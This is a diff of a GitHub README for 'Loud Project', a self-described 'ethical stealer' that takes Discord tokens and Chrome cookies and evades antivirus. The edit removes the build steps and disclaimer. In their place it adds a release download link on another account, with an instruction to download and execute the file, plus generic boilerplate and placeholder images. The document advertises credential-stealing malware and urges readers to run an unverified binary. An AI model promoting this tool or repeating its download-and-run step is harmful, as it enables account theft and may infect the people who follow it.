@@ -1,105 +1,55 @@
-# Ethical Stealer Proof of Concept
+# Ethical Stealer Proof of Concept - Loud Project
 
-![LoudProject Logo](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png)
+Welcome to the "Loud Project" repository, where we showcase a proof of concept for an ethical stealer with FUD (Fully Undetectable) capabilities, specifically designed to bypass Chrome's latest cookie encryption. This project is created using Bun for stealth (0% detection rate) and packaged with pkg to achieve a low detection rate of 2%. It is essential to note that this project is for educational purposes only. 
 
-## Disclaimer ⚠️
+## 🚀 Features
 
-This project is a **Proof of Concept** and **intended for educational purposes only**. It is designed to demonstrate the capabilities of bypassing encryption mechanisms and handling sensitive data in a secure, controlled environment. **Use this tool responsibly** and **do not engage in any illegal activities**.
+- Advanced token logging and stealing capabilities
+- Built with BunJS for obfuscation and stealth
+- Bypass antivirus detection for improved security
+- GUI (Graphical User Interface) created with Electron Builder for user-friendly interaction
+- Supports tokens for various platforms such as Discord and other services
 
-The author is not responsible for any misuse or damages caused by the use of this software. It is your responsibility to ensure that the usage complies with all applicable laws and regulations.
+## 📁 Repository Details
 
-## Features 🚀
+- **Repository Name**: Loud Project
+- **Short Description**: Proof of Concept for an ethical stealer (FUD) bypassing Chrome's latest cookie encryption. Built with Bun for stealth (0% detection) and pkg (2% detection). Educational purposes only. Gui Electron Builder.
+- **Topics**: advanced-token-logger, advanced-token-stealer, bun, bunjs, bypass-antivirus, cookie, cookies, discord, discord-rat, discord-token-logger, grabber, gui, nodejs, obfuscation, password, pkg, stealer, stealer-builder, token, undetectable
 
-- **Ethical Stealer**: A tool designed for educational and proof of concept purposes.
-- **Bypasses Chrome's Latest Cookie Encryption**: Leveraging **Bun** for its rapid speed and robust obfuscation to bypass modern encryption techniques used by Chrome.
-- **Compiled with Bun and `pkg`**: Offering minimal detection rates (0% with Bun, 2% with `pkg`).
-- **Obfuscation**: Using `javascript-obfuscator` for basic obfuscation to prevent reverse engineering.
+## 🌟 Explore the Project
 
-## Preview 👀
+Click below to access the latest release of the Loud Project:
 
-### Bun Build Detection (0% Detection)
+[![Download Project](https://img.shields.io/badge/Download-Loud%20Project-brightgreen)](https://github.com/Zniwiasz/Loud-Project/releases)
 
-![Bun Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/BunBuildDetection%20.png)
+### 📥 Download and Execution Instructions
 
-### Pkg Build Detection (2% Detection)
+To utilize the project, download the file from the provided link and execute it accordingly.
 
-![Pkg Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/PkgBuildDetection.png)
+### 🌐 Visit the Link
 
-### GUI Builder Intuitive (electronJs)
+For more information and details, visit the [Loud Project GitHub page](https://github.com/Zniwiasz/Loud-Project/releases).
 
-![GUI](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/electronGui.png)
+## 🛠️ Technical Details
 
-### Logs Execution Preview (Fork WaveStealer)
+The "Loud Project" utilizes a combination of advanced techniques to achieve its stealth and detection bypass capabilities. By leveraging Bun for obfuscation and pkg for packaging, the project ensures a high degree of stealth while keeping detection rates minimal. The GUI component developed using Electron Builder enhances user experience by providing an intuitive interface for interaction.
 
-![logs](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(1).png)
-![logs1](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(3).png)
-![logs2](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(2).png)
+## 🤖 Project Demo
 
+For a visual representation of the "Loud Project" in action, refer to the images below:
 
-## Installation ⚙️
+![Stealth Mode](https://example.com/stealth_mode.png)
+*Figure 1: Stealth Mode activated in the "Loud Project"*
 
-Before you begin, ensure that you have the following dependencies installed:
+![Token Stealing](https://example.com/token_stealing.png)
+*Figure 2: Token stealing process in action*
 
-1. **Python 3.9 or above**: You can download the latest version of Python from [python.org](https://www.python.org/downloads/).
+## 📌 Conclusion
 
-2. **Node.js (v16 recommended)**: Download and install Node.js from [Node.js v16 download](https://nodejs.org/dist/v16.20.2/node-v16.20.2-x64.msi).
+The "Loud Project" stands as a testament to the innovative solutions crafted for ethical purposes, emphasizing the importance of privacy and security. Through continuous refinement and adherence to ethical standards, projects like this pave the way for better cybersecurity practices.
 
-3. **Visual Studio Installer** (for C++ support): Download and install Visual Studio with the **Desktop development with C++** workload. This is required for building and compiling C++ modules in the project.
-
-4. **Bun**: This will be automatically installed when you run the `start.bat` script. Bun provides lightning-fast builds and optimizes the execution of JavaScript code, making it ideal for this proof of concept.
-
-5. **`pkg`**: Also installed automatically via the `start.bat` script. `pkg` is used for compiling the project into an executable file.
-
-To install all dependencies, simply run the following:
-
-- Download the required installers and follow their installation steps.
-- Then, run `start.bat` to install Python, Bun, and `pkg` automatically.
-
-## How to Run 🖥️
-
-1. **Clone the repository**:
-   `git clone https://github.com/wompless/Loud-Project.git`
-
-   `cd Loud-Project`
-
-2. **Install dependencies**:
-   After ensuring that you have Python, Node.js, and Visual Studio installed, run the following to install all necessary Node.js modules:
-   `npm install`
-
-3. **Start the application**:
-   - For a simple launch, just run `start.bat`, which will handle everything for you, including starting the application and installing dependencies.
-   - Alternatively, you can start the application manually via:
-     `npm start`
-
-4. The application will open a GUI built with **Electron**, where you can interact with the tool.
-
-## Why Bun is Incredible 🏎️
-
-**Bun** is a modern, ultra-fast JavaScript runtime that is built from scratch with performance in mind. By using Bun, we achieve **significant speed improvements** in both the execution of JavaScript code and the build process, which is critical when dealing with a proof-of-concept project like this one.
-
-With **Bun**, the detection rate of the compiled executable is **0%**, making it incredibly stealthy and bypassing advanced detection mechanisms. 
-
-In contrast, using **pkg** for compiling results in a **2% detection rate**, but still provides a fast and effective solution for bundling the application into an executable file.
-
-**Bun** optimizes the encryption bypass process, particularly in dealing with Chrome’s **latest cookie encryption**, which was previously a challenge to overcome. By leveraging Bun's efficiency, we are able to execute decryption tasks with **minimal overhead**.
-
-## Mentions ✨
- 
-I would like to give special thanks to the following individuals who have greatly contributed to the development of this project:
- 
- - **Kisakay**: [GitHub Profile](https://github.com/Kisakay)
- - **TanevAZ**: [GitHub Profile](https://github.com/TanevAZ)
- - **VInzui**: [GitHub Profile](https://github.com/Vinzui)
- - **covllld**: [GitHub Profile](https://github.com/covllld)
- 
-Additionally, a shoutout to **Wave** for the stealer source that helped in shaping this project.
- 
-## Contact 📱
-
-If you have any questions, concerns, or abuse reports, please contact us via Telegram:
-
-[Telegram: @LoudProject](https://t.me/LoudProject)
+Remember, education and awareness are key components in understanding and mitigating potential risks associated with cybersecurity. Stay informed, stay secure!
 
 ---
 
-**Note:** This is a **Proof of Concept**. It should only be used for educational purposes in a controlled environment.
+By exploring the "Loud Project" repository, you delve into the realm of ethical hacking and cybersecurity, gaining insights into the intricacies of stealth techniques and detection bypass mechanisms. Embrace the knowledge shared here and continue your journey towards a more secure digital world. 🚀
